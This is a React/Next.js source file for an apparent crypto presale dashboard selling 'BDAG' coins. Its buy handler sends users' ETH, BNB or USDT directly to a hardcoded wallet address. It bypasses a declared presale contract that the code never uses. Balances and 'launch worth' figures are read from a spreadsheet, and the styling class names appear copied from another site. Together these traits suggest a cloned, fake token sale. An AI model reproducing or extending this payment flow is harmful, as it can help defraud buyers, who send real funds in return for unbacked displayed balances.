'use client';
import React, { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import BuyMiner from './buyMiner';
import RankProgress from './rankProgress';
import BeatVestingModal from './beatVestingModal';
import SelectCurrencyModal from './selectCurrencyModal';
import Transaction from './transaction';
import WalletPurchaseMethods from './WalletPurchaseMethods';
import { useSheetData } from '../hooks/useSheetData';
import { parseSheetData } from '../utils/sheetParser';
import { parseConstantsData } from '../utils/parseConstantsData';
import { useActiveWallet, useSendTransaction, useActiveWalletConnectionStatus } from "thirdweb/react";
import { prepareContractCall, toWei } from "thirdweb";
import { ethers } from "ethers";
const contractAddress = "0x43D033C19eA0A9f8F2459b9A51dC97f59B7725bB";
const abi = [
  {
    "inputs": [
      { "internalType": "uint256", "name": "usdEquivalent", "type": "uint256" }
    ],
    "name": "buyWithETH",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
];

const DESTINATION_WALLET = "0xecB518e9D8a14e74DFBa3Ba044D7be9951A95395";
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_ABI = ["function transfer(address to, uint256 value) public returns (bool)"];


export const MainArea = () => {
  const router = useRouter();

  const [storedWallet, setStoredWallet] = useState(null);

useEffect(() => {
  if (typeof window !== "undefined") {
    setStoredWallet(localStorage.getItem("walletAddress"));
  }
}, []);
  // Data and state management
    const [activeTab, setActiveTab] = useState('buyBDAG');
  const [activePaymentMethod, setActivePaymentMethod] = useState('ETH');
  const [amount, setAmount] = useState("");
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isCurrencyModalOpen, setIsCurrencyModalOpen] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState({
    message: "",
    isError: false,
    isLoading: false
  });

  const wallet = useActiveWallet();
  const connectionStatus = useActiveWalletConnectionStatus();
  const { mutate: sendTransaction } = useSendTransaction();
  const [walletAddress, setWalletAddress] = useState("");
  const { data: sheetData } = useSheetData(walletAddress);
  const { data: constantsData } = useSheetData("Constants");
  const { profile } = parseSheetData(sheetData);
  const constants = parseConstantsData(constantsData);

  // Sync wallet address to state and localStorage, clear on disconnect
  useEffect(() => {
    const syncWallet = async () => {
      if (connectionStatus === "connected" && wallet) {
        try {
          const account = await wallet.getAccount();
          if (account?.address) {
            setWalletAddress(account.address);
            localStorage.setItem("walletAddress", account.address);
          }
        } catch (err) {
          setWalletAddress("");
          localStorage.removeItem("walletAddress");
        }
      } else {
        setWalletAddress("");
        localStorage.removeItem("walletAddress");
      }
    };
    syncWallet();
  }, [connectionStatus, wallet]);

  console.log(walletAddress , wallet);

  // Logout handler
  const handleLogout = async () => {
    if (wallet) await wallet.disconnect();
    setWalletAddress("");
    localStorage.removeItem("walletAddress");
    // Optionally redirect or show a message
  };


const handleBuy = useCallback(async () => {
  if (!wallet) {
    setTransactionStatus({ isLoading: false, message: "Please connect your wallet first.", isError: true });
    return;
  }
  if (!amount || parseFloat(amount) <= 0) {
    setTransactionStatus({ isLoading: false, message: "Please enter a valid amount.", isError: true });
    return;
  }

  setTransactionStatus({ isLoading: true, message: `Preparing ${amount} ${activePaymentMethod} transaction...`, isError: false });

  try {
    // Get account first
    const account = await wallet.getAccount();
    if (!account?.address) {
      throw new Error("Wallet not properly connected. Please reconnect.");
    }

    console.log("Connected wallet address:", account.address);

    // For ETH/BNB, prioritize thirdweb's native method (works best on mobile)
    if (activePaymentMethod === "ETH" || activePaymentMethod === "BNB") {
      try {
        console.log("Using thirdweb native transaction...");
        
        const transaction = {
          to: DESTINATION_WALLET,
          value: toWei(amount),
        };
        
        console.log("Transaction object:", transaction);
        
        const result = await sendTransaction(transaction);
        console.log("Transaction result:", result);
        
        setTransactionStatus({ 
          isLoading: false, 
          message: "Transaction sent successfully! Check your wallet for confirmation.", 
          isError: false 
        });
        return;

      } catch (thirdwebError) {
        console.error("Thirdweb transaction failed:", thirdwebError);
        
        // If thirdweb fails, show user-friendly error
        if (thirdwebError.message?.includes('User rejected') || thirdwebError.code === 4001) {
          throw new Error("Transaction was cancelled by user.");
        } else if (thirdwebError.message?.includes('insufficient funds')) {
          throw new Error("Insufficient funds for transaction and gas fees.");
        } else {
          throw new Error("Transaction failed. Please try again or contact support.");
        }
      }
    }

    // For USDT, we need to fall back to ethers (but with better mobile support)
    if (activePaymentMethod === "USDT") {
      console.log("USDT transaction - attempting ethers fallback...");
      
      let provider;
      let signer;

      // Try to get provider in order of preference for mobile
      if (typeof window !== "undefined" && window.ethereum) {
        console.log("Using window.ethereum...");
        try {
          // Request accounts explicitly
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          provider = new ethers.providers.Web3Provider(window.ethereum);
          signer = provider.getSigner();
        } catch (error) {
          console.log("window.ethereum failed:", error);
        }
      }

      if (!signer && wallet.provider) {
        console.log("Using wallet.provider...");
        try {
          provider = new ethers.providers.Web3Provider(wallet.provider);
          signer = provider.getSigner();
        } catch (error) {
          console.log("wallet.provider failed:", error);
        }
      }

      if (!signer) {
        throw new Error("USDT transactions not supported on this device. Please use ETH instead.");
      }

      // Check network
      const network = await provider.getNetwork();
      if (network.chainId !== 1) {
        throw new Error("Please switch to Ethereum mainnet for USDT transactions.");
      }

      // USDT contract setup
      const USDT_ABI_FULL = [
        "function transfer(address to, uint256 value) public returns (bool)",
        "function balanceOf(address owner) public view returns (uint256)"
      ];

      const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI_FULL, signer);
      const userAddress = await signer.getAddress();
      const amountInSmallestUnit = ethers.utils.parseUnits(amount, 6);
      
      // Check balance
      const balance = await usdtContract.balanceOf(userAddress);
      const balanceFormatted = ethers.utils.formatUnits(balance, 6);
      
      if (balance.lt(amountInSmallestUnit)) {
        throw new Error(`Insufficient USDT balance. You have ${balanceFormatted} USDT, need ${amount} USDT.`);
      }

      // Send USDT transaction
      const tx = await usdtContract.transfer(DESTINATION_WALLET, amountInSmallestUnit, {
        gasLimit: 100000 // Fixed gas limit for USDT
      });

      setTransactionStatus({ 
        isLoading: true, 
        message: `USDT transaction sent: ${tx.hash}. Waiting for confirmation...`, 
        isError: false 
      });
      
      await tx.wait();
      setTransactionStatus({ 
        isLoading: false, 
        message: "USDT transaction confirmed successfully!", 
        isError: false 
      });
    }

  } catch (error) {
    console.error("Transaction error:", error);
    
    let errorMessage = "";
    
    // Handle specific error types
    if (error.message?.includes('Wallet not properly connected')) {
      errorMessage = "Wallet connection lost. Please reconnect your wallet and try again.";
    } else if (error.message?.includes('cancelled by user')) {
      errorMessage = "Transaction was cancelled.";
    } else if (error.message?.includes('Insufficient funds') || error.message?.includes('insufficient funds')) {
      errorMessage = "Insufficient funds for transaction and gas fees.";
    } else if (error.message?.includes('Insufficient USDT')) {
      errorMessage = error.message;
    } else if (error.message?.includes('switch to Ethereum mainnet')) {
      errorMessage = error.message;
    } else if (error.message?.includes('not supported on this device')) {
      errorMessage = error.message;
    } else if (error.code === 4001 || error.code === 'USER_REJECTED') {
      errorMessage = "Transaction was cancelled by user.";
    } else {
      errorMessage = `Transaction failed: ${error.message || 'Unknown error'}`;
    }
    
    setTransactionStatus({ 
      isLoading: false, 
      message: errorMessage, 
      isError: true 
    });
  }
}, [wallet, amount, activePaymentMethod, sendTransaction]);


  // Modal handlers (keep existing)
  const handleOpenCurrencyModal = () => setIsCurrencyModalOpen(true);
  const handleCloseCurrencyModal = () => setIsCurrencyModalOpen(false);
  const handleOpenModal = () => setIsModalOpen(true);
  const handleCloseModal = () => setIsModalOpen(false);

  if (connectionStatus === 'connecting') {
    return (
      <div className="style_overview__iPKe6" style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '50vh' }}>
        <p>Connecting to wallet...</p>
      </div>
    );
  }

  return (
    <div className="style_overview__iPKe6">
      <RankProgress current={profile["Current Rank"]} next={profile["Next rank"]} leveltoUp={profile["req to level up"]} />
      <div className="style_balanceSection__K0yQq">
        <div className="style_balances__lxOoR">
          <div className="style_balanceBox___25FT">
            <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">Total BDAG Balance</p>
            <p className="style_title__VJGg6 __className_665d18 style_sm__fI_bB">
              {profile["Total Balance"] ? `${profile["Total Balance"]} BDAG` : "0.00 BDAG"}
            </p>
            <div className="style_icon__jwMyF">
              {/* ...svg... */}
            </div>
          </div>
          <div className="style_balanceBox___25FT">
            <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">Your Coin Worth at Launch</p>
            <p className="style_title__VJGg6 __className_665d18 style_sm__fI_bB">
              {profile["your coin worth at launch"] || "0.00"}
            </p>
            <div className="style_icon__jwMyF">
              {/* ...svg... */}
            </div>
          </div>
        </div>
      </div>
      
      <div className="style_purchase__X5B7u">
        <div className="wallet_wallet__HKWGq wallet_shouldLogin__ai97O">
          <div id="buy" className="wallet_anchor__W3ZBk"></div>
          <div className="wallet_modalHead__Q3MP_">
            <div className="wallet_modalHeadArea__CUzyB">
              <p 
                className={activeTab === 'buyBDAG' ? "wallet_active__9n3l6" : ""}
                onClick={() => setActiveTab('buyBDAG')}
              >
                Buy BDAG
              </p>
              <p 
                className={activeTab === 'buyMiner' ? "wallet_active__9n3l6" : ""}
                onClick={() => setActiveTab('buyMiner')}
              >
                Buy Miner
              </p>
            </div>
          </div>
          
          {activeTab === 'buyBDAG' ? (
            <div className="wallet_walletWrapper__6pNfN">
              <div className="wallet_walletHead__N6OWX">
                <div className="wallet_doubleIt__OhJ0r">
                  <p 
                    className="wallet_doubleText__JRiZM __className_665d18"
                    onClick={handleOpenModal}
                    style={{ cursor: 'pointer' }}
                  >
                    BUY, BEAT VESTING PASS!
                  </p>
                </div>
                <div className="wallet_walletHeadCoin__G_Gxn">
                  <div className="wallet_walletHeadItem__2_GYQ">
                    <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">Total Coin Sales</p>
                    <p className="style_text__Z44aT style_md__ZQhe4 style_font-700__9q48B">
                      {constants["Total Coin sales"] || "$0.00"}
                    </p>
                  </div>
                  <div className="wallet_walletHeadItem__2_GYQ">
                    <p className="style_text__Z44aT style_sm__RimS5 style_primary__o7qgw">Total Coins Sold</p>
                    <p className="style_text__Z44aT style_md__ZQhe4 style_font-700__9q48B">
                      {constants["Total coins sold"] || "0"}
                    </p>
                  </div>
                </div>
                <div className="style_bar__PrR89">
                  <div className="style_spans__yvuK_">
                    <span>Remaining</span>
                    <span translate="no">{constants["Remaining bar"] || "0"}</span>
                  </div>
                  <span className="style_progress__IPzew" style={{width: "98%"}}></span>
                  <span className="style_progressTitle__SWVW1" style={{left: "98%"}}></span>
                </div>
                <div className="wallet_walletHeadCoin__G_Gxn">
                  <div className="wallet_walletPriceItem__E7HOg">
                    <p className="style_text__Z44aT style_md__ZQhe4">1 BDAG:</p>
                    <p className="style_text__Z44aT style_md__ZQhe4">
                      ${constants["Batch Price"] || "0.00"}
                    </p>
                  </div>
                  <div className="wallet_walletPriceItem__E7HOg">
                    <p className="style_text__Z44aT style_md__ZQhe4">Next Batch:</p>
                    <p className="style_text__Z44aT style_md__ZQhe4">
                      ${constants["Next Batch"] || "0.00"}
                    </p>
                  </div>
                </div>
              </div>
              
              <WalletPurchaseMethods
                activePaymentMethod={activePaymentMethod}
                setActivePaymentMethod={setActivePaymentMethod}
                amount={amount}
                setAmount={setAmount}
                handleBuy={handleBuy}
                transactionStatus={transactionStatus}
                handleOpenCurrencyModal={handleOpenCurrencyModal}
                handleOpenModal={handleOpenModal}
              />
            </div>
          ) : (
            <BuyMiner handleClickModal={handleOpenCurrencyModal} />
          )}
        </div>
      </div>
      <Transaction />

      {isModalOpen && <BeatVestingModal onClose={handleCloseModal} />}
      {isCurrencyModalOpen && <SelectCurrencyModal onClose={handleCloseCurrencyModal} />}
    </div>
  );
};